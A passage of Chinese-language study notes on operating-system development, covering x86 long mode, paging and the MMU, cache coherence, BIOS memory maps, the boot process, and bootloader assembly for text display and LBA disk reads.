alt=""></p></li><li><p>在长模式下，CPU<strong>不再对段基址和段长度进行检查</strong>，只对DPL进行相关的检查，检查流程和保护模式下一样</p></li><li><p>多个段描述在内存中形成一个全局段描述符表，同样由CPU的GDTR寄存器指向</p></li><li><p>长模式下的段描述符表，段长度和段基址都是无效的填充为0，CPU不做检查，段描述符的DPL=0，说明需要最高权限即CPL=0才能访问，当描述符中的L=1，D/B=0时，是64位代码段，若是数据段的话，G、D/B、L位都无效</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">ex64_GDT:null_dsc:dq 0;第一个段描述符CPU硬件规定必须为0c64_dsc:dq 0x0020980000000000  ;64位代码段;无效位填0;D/B=0,L=1,AVL=0 ;P=1,DPL=0,S=1;T=1,C=0,R=0,A=0d64_dsc:dq 0x0000920000000000  ;64位数据段;无效位填0;P=1,DPL=0,S=1;T=0,C/E=0,R/W=1,A=0eGdtLen equ $ - null_dsc;GDT长度eGdtPtr:dw eGdtLen - 1;GDT界限 dq ex64_GDT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="长模式中断">长模式中断</h5><ul><li><p>保护模式下为了实现对中断进行权限检查，实现了中断门描述符，在中断门描述符中存放了对应的段选择子和其段内偏移，还有DPL权限，如果权限检查通过，则用对应的段选择子和其段内偏移装载CS:EIP寄存器</p></li><li><p>长模式支持64位内存寻址，需要对中断门描述符进行修改和扩展</p><ul><li>在原有基础上<strong>增加8字节</strong>用于存放目标段偏移的高32位值</li><li>目标代码段选择子对应的代码段描述符必须是64位的代码段</li><li>其中的IST是64位TSS中的IST指针</li></ul><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220704-long-mode-interrupt-gate.jpg" alt=""></p></li><li><p>长模式在内存中有一个中断门描述符表，表中的条目是16字节大小，最多支持256个中断源，对中断的响应和相关权限的检查和保护模式一样</p></li></ul><h5 id="切换到长模式">切换到长模式</h5><ol><li><p>准备长模式全局段描述符表</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">ex64_GDT:null_dsc:dq 0;第一个段描述符CPU硬件规定必须为0c64_dsc:dq 0x0020980000000000  ;64位代码段d64_dsc:dq 0x0000920000000000  ;64位数据段eGdtLen equ $ - null_dsc;GDT长度eGdtPtr:dw eGdtLen - 1;GDT界限 dq ex64_GDT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>准备长模式下的MMU页表，这个是为了开启分页模式，<strong>切换到长模式必须要开启分页</strong>，长模式下内存地址空间的保护交给了MMU</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov eax, cr4bts eax, 5   ;CR4.PAE = 1mov cr4, eax ;开启 PAEmov eax, PAGE_TLB_BADR ;页表物理地址mov cr3, eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>加载GDTR寄存器，使之指向全局段描述表</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lgdt [eGdtPtr]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>开启长模式，要<strong>同时开启保护模式和分页模式</strong>，在实现长模式时定义了MSR寄存器，需要用专用的指令<code>rdmsr</code>、<code>wrmsr</code>进行读写，IA32_EFER寄存器的第8位决定了是否开启长模式</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">;开启 64位长模式mov ecx, IA32_EFERrdmsrbts eax, 8  ;IA32_EFER.LME =1wrmsr;开启 保护模式和分页模式mov eax, cr0bts eax, 0    ;CR0.PE =1bts eax, 31mov cr0, eax <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>进行跳转，加载CS段寄存器，刷新其影子寄存器</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmp 08:entry64 ;entry64为程序标号即64位偏移地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="小结-3">小结</h4><ul><li><p>实模式，早期CPU是为了支持单道程序运行而实现的，单道程序能掌控计算机所有的资源，早期的软件规模不大，内存资源也很少，所以实模式极其简单，仅支持16位地址空间，分段的内存模型，<strong>对指令不加限制地运行，对内存没有保护隔离作用</strong></p></li><li><p>保护模式，随着多道程序的出现，就需要操作系统了，内存需求量不断增加，所以CPU实现了保护模式以支持这些需求，保护模式包含<strong>特权级</strong>，对指令及其访问的资源进行控制，对内存段与段之间的访问进行严格检查，对中断的响应也要进行严格的权限检查，扩展了CPU寄存器位宽，使之能够寻址32位的内存地址空间和处理32位的数据，从而CPU的性能大大提高</p></li><li><p>长模式，又名AMD64模式，由于软件对CPU性能需求永无止境，所以长模式在保护模式的基础上，把寄存器扩展到64位同时增加了一些寄存器，使CPU具有了能处理64位数据和寻址64位的内存地址空间的能力，长模式<strong>弱化段模式管理</strong>，只保留了权限级别的检查，忽略了段基址和段长度，而地址的检查则交给了MMU</p></li></ul><br><h3 id="地址转换">地址转换</h3><ul><li>在 intel x86 下，<strong>逻辑地址</strong>（logical address）由一个段标识符加上一个指定段内的相对地址的偏移量组成，表示为 <code>[selector:offset]</code>，例如：<code>[cs:eip]</code></li><li><strong>虚拟地址</strong>（virtual address）是组成逻辑地址的段内偏移 offset，这个地址是虚拟而统一的，由链接器产生<ul><li>链接器的主要工作就是把多个代码模块组装在一起，并解决模块之间的引用，即处理程序代码间的地址引用，形成程序运行的静态内存空间视图</li><li>内存需要<strong>隔离和保护</strong>，从而提出了虚拟地址与物理地址分离，让应用程序从实际的物理内存中解耦出来</li></ul></li><li><strong>物理地址</strong>（physical address）是真正的物理内存的地址，这个数据会被地址译码器等电子器件变成电子信号放在地址总线上，地址总线电子信号的各种组合就可以选择到内存的储存单元</li><li><strong>线性地址</strong>（linear address）是由逻辑地址经过一系列转换得到的，具体来讲就是： 线性地址=段描述符所在段的基地址+段内偏移（intel x86 线性地址由逻辑地址经过段页式转换得到）</li></ul><h4 id="MMU">MMU</h4><ul><li><p>MMU即<strong>内存管理单元</strong>，是用硬件电路逻辑实现的一个地址转换器件，它负责接受虚拟地址和地址关系转换表（页表），以及输出物理地址</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220709-mmu.jpg" alt=""></p></li><li><p>根据实现方式的不同，MMU可以是独立的芯片，也可以是集成在其它芯片内部的，比如集成在CPU内部（x86、ARM系列）</p></li><li><p>MMU是分页模型，实现地址关系转换表要把虚拟地址空间和物理地址空间都分成同等大小的块，也称为页，按照虚拟页和物理页进行转换</p></li><li><p>分页模式的<strong>灵活性、通用性、安全性</strong>，是现代操作系统内存管理的基石，更是事实上的标准内存管理模型，现代商用操作系统都必须以此为基础实现虚拟内存功能模块</p></li><li><p>x86 CPU要想开启MMU，就必须先开启保护模式或者长模式，实模式下不能开启MMU，由于保护模式的内存模型是分段模型，它并不适合于MMU的分页模型，所以要使用保护模式的<strong>平坦模式</strong>绕过分段模型，平坦模式和长模式下线性地址和虚拟地址是相等的</p></li><li><p>地址产生的过程：</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220118-mmu.png" alt=""></p></li><li><p>在保护模式下可以关闭MMU，这个线性地址就是物理地址，因为长模式下的分段<strong>弱化了地址空间的隔离</strong>，所以开启MMU是必须的</p></li></ul><h4 id="页表">页表</h4><ul><li><p>页表描述了虚拟地址到物理地址的转换关系，也可以说是虚拟页到物理页的映射关系，所以称为页表，为了增加灵活性和节约物理内存空间，页表中只存放物理页面的地址，MMU以虚拟地址为索引去查表返回物理页面地址</p></li><li><p>页表是分级的，总体分为三个部分：一个顶级页目录，多个中级页目录，最后才是页表</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220710-page-table.jpg" alt=""></p></li><li><p>MMU的工作流程：第一个位段索引顶级页目录中一个项，该项指向一个中级页目录，然后用第二个位段去索引中级页目录中的一个项，该项指向一个页目录，再用第三个位段去索引页目录中的项，该项指向一个物理页地址，最后用第四个位段作该物理页内的偏移去访问物理内存</p></li></ul><h4 id="保护模式下的分页">保护模式下的分页</h4><blockquote><p>x86 CPU上的分页模式</p></blockquote><h5 id="4KB页">4KB页</h5><ul><li><p>CR3是CPU的一个32位的寄存器，MMU根据这个寄存器找到页目录</p></li><li><p>32位虚拟地址被分为三个位段：<strong>页目录索引、页表索引、页内偏移</strong><sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220710-4k-page.jpg" alt=""></p><ul><li>只有一级页目录（Page Directory），其中包含1024个页目录项 ，每个页目录项4字节，指向一个页表</li><li>每个页表（Page Table）中有1024个页表项，每个页表项4字节，指向一个物理页</li><li>每个物理页4KB</li></ul></li></ul><br><h5 id="4MB页">4MB页</h5><ul><li><p>32位虚拟地址被分为两个位段：<strong>页表索引、页内偏移</strong></p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220710-4m-page.jpg" alt=""></p><ul><li>只有一级页目录，其中包含1024个页表项，一个页表项指向一个物理页</li><li>每个物理页4MB</li></ul></li><li><p>CR3不再指向顶级页目录而是指向一个4KB大小的页表，其中包含1024个页表项</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220711-4m-page-format.jpg" alt=""></p><ul><li>页表项为了兼容4MB页表项低8位和4KB页表项一样，只不过第7位变成了PS位，且必须为1，而PAT位移到了12位</li></ul></li></ul><h4 id="长模式下的分页">长模式下的分页</h4><ul><li>开启了长模式则必须同时开启分页模式，因为长模式弱化了分段模型</li><li>长模式扩展了CPU的位宽，使得CPU能使用64位的超大内存地址空间，长模式下的虚拟地址必须等于线性地址且为64位</li></ul><h5 id="4KB页-2">4KB页</h5><ul><li><p>长模式下4KB分页下，由一个顶层目录、二级中间层目录和一层页表组成了64位地址翻译过程（==4级页表==）</p></li><li><p>CR3变成64位的CPU的寄存器，它指向一个顶级页目录</p></li><li><p>64位虚拟地址被分为6个位段，分别是：保留位段，顶级页目录索引、页目录指针索引、页目录索引、页表索引、页内偏移</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220710-long-mode-4k-page.jpg" alt=""></p></li><li><p>顶级页目录、页目录指针、页目录、页表各占有4KB大小，其中各有512个条目，每个条目8字节64位大小<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup></p><ul><li>XD位可以控制代码页面是否能够运行</li></ul></li><li><p>虚拟地址48到63这6位是根据<strong>第47位</strong>来决定的，47位为1，它们就为1，反之为0，这是因为<strong>x86 CPU并没有实现全64位的地址总线，而是只实现了48位</strong>，这种最高有效位填充的方式，即使后面扩展CPU的地址总线也不会有任何影响</p><blockquote><p>如果64位地址全用，地址翻译开销太大，并且浪费内存，TLB/cache的尺寸也跟着增大（<a href="https://www.zhihu.com/question/28638698/answer/2574039113">为什么64位机指针只用48个位？</a>）</p></blockquote></li></ul><br><h5 id="2MB页">2MB页</h5><ul><li><p>64位虚拟地址被分为5个位段 ：保留位段、顶级页目录索引、页目录指针索引、页目录索引</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220711-long-mode-2m-page.jpg" alt=""></p></li><li><p>页内偏移，顶级页目录、页目录指针、页目录各占有4KB大小，其中各有512个条目，每个条目8字节64位大小<sup class="footnote-ref"><a href="#fn7" id="fnref7">[7]</a></sup></p></li><li><p>长模式下2MB和4KB分页的区别是，2MB分页下是页目录项直接指向了2MB大小的物理页面，<strong>放弃了页表项</strong>，然后把虚拟地址的低21位作为页内偏移，21位正好索引2MB大小的地址空间</p></li></ul><br><h4 id="开启MMU">开启MMU</h4><ol><li><p>使CPU进入保护模式或者长模式</p></li><li><p>准备好页表数据，包含顶级页目录，中间层页目录，页表</p></li><li><p>把顶级页目录的物理内存地址赋值给CR3寄存器</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov eax, PAGE_TLB_BADR ;页表物理地址mov cr3, eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>设置CPU的CR0的PE位为1</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">;开启 保护模式和分页模式mov eax, cr0bts eax, 0    ;CR0.PE =1bts eax, 31   ;CR0.P = 1mov cr0, eax <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><blockquote><p>MMU地址转换失败</p><ol><li>MMU停止转换地址</li><li>MMU把转换失败的虚拟地址写入CPU的CR2寄存器</li><li>MMU触发CPU的14号中断，使CPU停止执行当前指令</li><li>CPU开始执行14号中断的处理代码，代码会检查原因，处理好页表数据返回</li><li>CPU中断返回继续执行MMU地址转换失败时的指令</li></ol></blockquote><br><h3 id="Cache与内存">Cache与内存</h3><h4 id="Cache">Cache</h4><ul><li><p>CPU到内存的性能瓶颈：用一块小而快的储存器放在CPU和内存之间，利用程序的局部性原理<sup class="footnote-ref"><a href="#fn8" id="fnref8">[8]</a></sup>来缓解，即Cache</p></li><li><p>数据一致性问题，主要包括三个方面</p><ul><li>一个CPU核心中指令Cache和数据Cache的一致性问题</li><li>多个CPU核心各自的2级Cache的一致性问题</li><li>CPU的3级Cache与设备内存，如DMA、网卡帧储存，显存之间的一致性问题</li></ul></li><li><p>典型的多核心Cache数据同步协议有<code>MESI</code>和<code>MOESI</code></p><blockquote><p>如何写出提高Cache命中率的代码？</p></blockquote></li></ul><h4 id="MESI协议">MESI协议</h4><ul><li>协议定义了4种基本状态：<code>M</code>、<code>E</code>、<code>S</code>、<code>I</code>，即修改（Modified）、独占（Exclusive）、共享（Shared）和无效（Invalid）</li><li>M（Modified）：当前Cache的内容有效，数据已经被修改而且与内存中的数据不一致，数据只在当前Cache里存在</li><li>E（Exclusive）：当前Cache中的内容有效，数据与内存中的数据一致，数据只在当前Cache里存在</li><li>S（Shared）：当前Cache中的内容有效，Cache中的数据与内存中的数据一致，数据在多个CPU核心中的Cache里面存在</li><li>I（Invalid）：当前Cache无效</li><li>Cache硬件会监控所有CPU上Cache的操作，根据相应的操作使得Cache里的数据行在上面这些状态之间切换</li></ul><h4 id="开启Cache">开启Cache</h4><ul><li><p>x86 CPU上默认关闭Cache，需要在CPU初始化时将其开启</p></li><li><p>开启Cache只需要将CR0寄存器中CD、NW位<strong>同时清0</strong>即可（CD=1时表示Cache关闭，NW=1时CPU不维护内存数据一致性）</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov eax, cr0;开启 CACHE    btr eax,29 ;CR0.NW=0btr eax,30;CR0.CD=0mov cr0, eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="获取内存视图">获取内存视图</h4><ul><li><p>内存空间只是映射物理地址空间中的一个子集，关键是要<strong>获取物理地址空间上可以读写的内存</strong></p></li><li><p>在x86平台上使用BIOS提供的实模式下中断服务<code>int 15h</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_getmemmap:xor ebx,ebx ;ebx设为0mov edi,E80MAP_ADR ;edi设为存放输出结果的1MB内的物理内存地址loop:mov eax,0e820h ;eax必须为0e820hmov ecx,20 ;输出结果数据项的大小为20字节：8字节内存基地址，8字节内存长度，4字节内存类型mov edx,0534d4150h ;edx必须为0534d4150hint 15h ;执行中断jc error ;如果flags寄存器的C位置1，则表示出错add edi,20;更新下一次输出结果的地址cmp ebx,0 ;如ebx为0，则表示循环迭代结束jne loop  ;还有结果项，继续迭代    reterror:;出错处理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>迭代中执行中断，每次中断都输出一个20字节大小数据项，最后会形成一个该数据项（结构体）的数组，可以用C语言结构表示</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">RAM_USABLE <span class="token number">1</span> </span><span class="token comment">//可用内存</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">RAM_RESERV <span class="token number">2</span> </span><span class="token comment">//保留内存不可使用</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">RAM_ACPIREC <span class="token number">3</span> </span><span class="token comment">//ACPI表相关的</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">RAM_ACPINVS <span class="token number">4</span> </span><span class="token comment">//ACPI NVS空间</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">RAM_AREACON <span class="token number">5</span> </span><span class="token comment">//包含坏内存</span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">s_e820</span><span class="token punctuation">{</span>    u64_t saddr<span class="token punctuation">;</span>    <span class="token comment">/* 内存开始地址 */</span>    u64_t lsize<span class="token punctuation">;</span>    <span class="token comment">/* 内存大小 */</span>    u32_t type<span class="token punctuation">;</span>    <span class="token comment">/* 内存类型 */</span><span class="token punctuation">}</span>e820map_t<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><br><h3 id="计算机启动过程">计算机启动过程</h3><ul><li><p>开机后OS需要接管CPU的控制权，但在OS运行之前是BIOS在管理计算机</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-os-start.jpg" alt=""></p></li><li><p>BIOS<sup class="footnote-ref"><a href="#fn9" id="fnref9">[9]</a></sup></p><ul><li>BIOS 固件固化在 PC 机主板上的 ROM 芯片中</li><li>芯片组检测到电源已经开始稳定供电，撤去 RESET 信号，CPU 进行重置（<code>0xFFFF0</code>），开始执行 BIOS 程序</li><li>POST（<code>power on self test</code>）加电自检：对硬件进行一系列测试</li><li>初始化：在内存中建立中断表和中断服务程序、设置寄存器、对一些外设进行初始化和检测等</li><li>加载引导设备的引导扇区<ul><li>搜索可引导的设备（顺序由 CMOS 中的设置信息决定）</li><li>检查启动盘上的 MBR 分区（最后2个字节必须是 magic number）</li><li>加载 MBR 到内存 <code>0x7C00</code> 处，然后跳转执行，BIOS 将控制权转交给 MBR</li></ul></li></ul></li><li><p>引导程序</p><ul><li>扫描硬盘分区表，并加载硬盘活动分区</li><li>加载分区引导记录 PBR（活动分区的第一个扇区），搜索并激活用于引导操作系统的程序</li><li>加载操作系统后控制权转交给内核</li><li><code>GRUB</code> 引导程序<ul><li>MBR 除去64字节的分区表和2字节的启动标志后装不下 GRUB，所以其加载分成了多个步骤，再加载各个 mod 后 GRUB 就支持了文件系统，访问磁盘不再依靠 BIOS 中断</li><li>GRUB 启动后，选择对应的启动菜单项，会定位到对应的eki文件并尝试加载（eki文件需要满足GRUB多协议引导头的格式要求）</li><li>boot 阶段结束，开始进入 startup 阶段</li></ul></li></ul></li></ul><h2 id="03-控制计算机屏幕">03 | 控制计算机屏幕</h2><ul><li><strong>显示的原理</strong>：屏幕上的内容=显存中的数据，显卡控制的最小单位是像素，一个像素对应屏幕上一个点</li><li>现在显卡几乎都支持 VESA 制定的 VBE 标准，这种标准下有两种工作模式：文本模式和图形模式</li></ul><h3 id="文本模式">文本模式</h3><ul><li><p>专门用来显示字符的工作方式</p></li><li><p>PC 在加电自检后系统会初始化为 80 × 25 的文本模式<sup class="footnote-ref"><a href="#fn10" id="fnref10">[10]</a></sup></p></li><li><p>显存的地址空间 <code>A0000h-BFFFFh</code> 共128K空间，其中 <code>B8000h-BFFFFh</code> 共32K的空间是 80 × 25 彩色字符模式显示缓冲区，显示缓冲区分为8页，显示器可以显示任意一页的内容，通常情况下 B8000H-B8F9F 中的内容将出现在显示器上</p></li><li><p>显示器可以显示25行，每行80个字符，每两个字节对应一个字符，其中一个字节是字符的 ASCII 码，另一个字节为字符的属性字节，每个字符可以有256种属性（背景色、前景色、闪烁、高亮等组合信息）</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-rgb.png" style="zoom: 67%;"></li></ul><h3 id="实验-5">实验</h3><ol><li><p>编写汇编代码</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov ax,0xb800 ;指向文本模式的显示缓冲区mov es,axmov byte [es:0x00],'I'  ;显示内容 byte [es:]用于寻址mov byte [es:0x01],0x07 ;字符属性mov byte [es:0x02],'L'mov byte [es:0x03],0x06times 510 - ($-$$)db 0dw 0xaa55<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编译</p></li><li><p>写入磁盘</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210219-dd.png" alt=""></p></li><li><p>在虚拟机中运行</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-display.png" alt=""></p></li></ol><h2 id="04-从硬盘引导">04 | 从硬盘引导</h2><ul><li><p>目前硬盘一般分为 <strong>HDD</strong>（Hard Disk Drive，传统的磁碟型机械硬盘）和 <strong>SSD</strong>（Solid State Disk，固态硬盘）</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-drive.jpg" style="zoom:80%;"><ul><li><p><strong>HDD</strong>：Hard Disk Drive，即传统机械硬盘</p><ul><li>由盘片、磁头、转轴、控制电机等部分组成，工作时盘片转动，磁头定位在盘片的指定位置上进行读写操作</li><li>优势在于容量大、成本低，寿命也相对较长，适合进行大容量的数据写入</li><li>缺点也非常明显，比如体积重量大、发热量大、速度慢、不抗震、噪音大等等</li></ul></li><li><p><strong>SSD</strong>：Solid-State Drive（固态硬盘）</p><ul><li>一般使用 <strong>NAND 闪存</strong>制成</li><li>由于不存在机械部件，所以稳定性、噪音、发热量、抗震性都要比传统机械硬盘更好，读写速度也更快，但是价格也更高</li></ul></li></ul></li><li><p><strong>磁盘结构</strong></p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-hdd.jpg" style="zoom: 80%;"><ul><li>磁道<code>Track</code>：当磁盘旋转时，磁头若保持在一个位置上，则每个磁头都会在磁盘表面划出一个圆形轨迹，这些圆形轨迹就叫做磁道</li><li>柱面<code>Cylinder</code>：由不同盘片的半经大小相同的磁道所组成的圆柱面</li><li>扇区<code>Sector</code>：磁盘上的每个磁道被等分为若干个弧段，这些弧段便是硬盘的扇区<ul><li><p>硬盘的第一个扇区，叫做引导扇区</p></li><li><p>磁盘又称<strong>块设备</strong>，因为存取不是字节流形式的，而是以块为单位，每个块为一个扇区</p></li><li><p>磁头：主要作用是将存储在硬盘盘片上的磁信息转化为电信号向外传输</p><ul><li>工作原理是利用特殊材料的电阻值会随着磁场变化的原理来读写盘片上的数据</li><li>磁头的好坏在很大程度上决定着硬盘盘片的存储密度</li></ul></li></ul></li></ul></li><li><p>编址<sup class="footnote-ref"><a href="#fn11" id="fnref11">[11]</a></sup></p><ul><li>从存储设备（硬盘）到文件系统的<strong>第一层抽象</strong>，即抽象出块设备的块号（块地址）</li><li>编址时优先考虑磁盘旋转，而后再考虑磁头移动（以柱面优先的形式编址）</li><li><code>CHS</code><ul><li>CHS寻址模式使用柱面号+磁头号+扇区号来编址（C，H，S）</li><li>地址（块号）=<code>C × (nHeads × nSectors) + H × nSectors + S</code></li></ul></li><li><code>LBA</code><ul><li>扩大了寻址范围，对所有扇区统一编址，称为逻辑扇区，提供逻辑扇区号访问</li><li>LBA28，使用 28bit 表示逻辑扇区号，每个扇区 512 B，总共可管理 128 GB 的硬盘</li><li>LBA48，46bit 表示逻辑扇区号，可管理 131072 TB 的硬盘容量</li></ul></li></ul></li><li><p>硬盘控制器</p><ul><li><strong>CPU通过 IO 接口与外设进行通信</strong>，对于硬盘来说，其 IO 接口就是硬盘控制器，硬盘和硬盘控制器整合在一起，接口被称作集成设备电路（IDE）</li><li>存储介质与计算机的接口共同遵循着 ATA 标准，主机与硬盘之间的数据传输按程序 I/O 或 DMA 方式进行，硬盘的寻址方式可按 CHS 或 LBA</li><li>ATA 产生了多种分类，主要是串行 ATA（Serial ATA）、并行ATA（Parallel ATA）<ul><li>一个 PATA 线可以挂两个硬盘，一个主盘，一个从盘</li></ul></li><li>硬盘控制器端口指硬盘控制器上的寄存器<sup class="footnote-ref"><a href="#fn12" id="fnref12">[12]</a></sup>（Data 寄存器、Error 寄存器、Device 寄存器等）</li></ul></li><li><p>LBA28 访问硬盘</p><ul><li><p>主硬盘控制器有 8 个端口，端口号从 <code>0x01f0</code> 到 <code>0x01f7</code></p></li><li><p>设置要读取的扇区数量</p><ul><li><code>0x01f2</code>，表示读取的扇区数</li></ul></li><li><p>设置起始 LBA 扇区号</p><ul><li><code>0x01f3</code>-<code>0x01f5</code>，表示起始 LBA 扇区号 23~0 位</li><li><code>0x01f6</code>，低 4 位表示起始 LBA 扇区号的 27~24 位，第 4 位指定主从盘，第 6 位设置 LBA/CHS</li></ul></li><li><p>设置命令</p><ul><li><code>0x01f7</code>，既是命令端口，又是状态端口，当端口值为<code>0x20</code>时，表示读</li></ul></li><li><p>等待读写操作完成</p><ul><li>硬盘读写期间 <code>0x01f7</code> 表示硬盘状态</li></ul></li><li><p>连续取出数据</p><ul><li><code>0x01f0</code>，数据端口，这是一个 16 bit 端口</li></ul></li><li><p>错误信息</p><ul><li><code>0x01f1</code>，包含硬盘驱动器最后一次执行命令后的状态，错误原因</li></ul></li></ul></li></ul><h3 id="实验-6">实验</h3><blockquote><p>将第二个扇区里面的内容加载进入内存</p></blockquote><ol><li><p>编写汇编代码</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; 将第二个扇区里面的内容加载进入内存，放入0x900LOADER_BASE_ADDRequ 0x900LOADER_START_SECTORequ 0x2; 表示loader在第2块扇区SECTION MBR vstart=0x7c00mov ax,csmov ds,axmov es,axmov ss,axmov fs,axmov sp,0x7c00mov ax,0xb800mov gs,ax;利用0x06的功能，调用10号中断，清屏mov ax, 0600hmov bx, 0700h; 上卷行的属性mov cx,0     ; 左上角mov dx,184fh ; 右下角(80,25)int 10h;输出当前在MBRmov byte [gs:0x00], '1'mov byte [gs:0x01], 0xA4; ...mov eax,LOADER_START_SECTOR ; LBA 读入的扇区mov bx,LOADER_BASE_ADDR; 写入的地址mov cx,1; 等待读入的扇区数call rd_diskjmp LOADER_BASE_ADDR; 跳到实际的物理内存rd_disk:mov esi,eax ; 备份eaxmov di,cx ; 备份cx;读写硬盘mov dx, 0x1f2mov al, clout dx, al   ; 设置要读取的扇区数量mov eax,esi  ; 恢复;将LBA的地址存入0x1f3，0x1f6mov dx, 0x1f3out dx,al    ; 7-0位写入0x1f3mov cl,8shr eax,clmov dx,0x1f4out dx,al    ; 15-8位写入0x1f4shr eax,clmov dx,0x1f5out dx,al    ; 23-16位写给1f5shr eax,cland al,0x0for al,0xe0 ; 设置7-4位为1110mov dx,0x1f6out dx,almov dx,0x1f7mov al,0x20out dx,al    ; 向0x1f7写入读命令.not_ready:  ; 检测硬盘状态nopin al,dxand al,0x88  ; 4位为1表示可以传输，7位为1表示硬盘忙cmp al,0x08jnz .not_ready;读数据mov ax,dimov dx, 256mul dxmov cx,axmov dx,0x1f0.go_on:in ax,dxmov [bx],axadd bx,2loop .go_onrettimes 510 - ($-$$)db 0dw 0xaa55<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用<code>Nasm</code>进行编译</p></li><li><p>写入磁盘</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-dd.png" alt=""></p></li><li><p>在虚拟机中运行</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220214-display.png" alt=""></p><blockquote><p>突破了512字节！</p></blockquote></li></ol><h2 id="05-保护模式实战">05 | 保护模式实战</h2><ul><li>环境：DOS6.22</li></ul><h3 id="实验-7">实验</h3><ul><li><p>代码</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>内核映像格式</p><h2 id="设置工作模式与环境">设置工作模式与环境</h2><h3 id="建立计算机">建立计算机</h3><ul><li><p>内核映像文件：包含二级引导器模块，内核模块，图片和字库文件</p></li><li><p>映像打包工具</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lmoskrlimg -m k -lhf GRUB头文件 -o 映像文件 -f 输入的文件列表<span class="token comment"># -m 模式 只能是k内核模式</span><span class="token comment"># -lhf GRUB头文件</span><span class="token comment"># -o 输出的映像文件名 </span><span class="token comment"># -f 输入文件列表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>安装虚拟机<sup class="footnote-ref"><a href="#fn13" 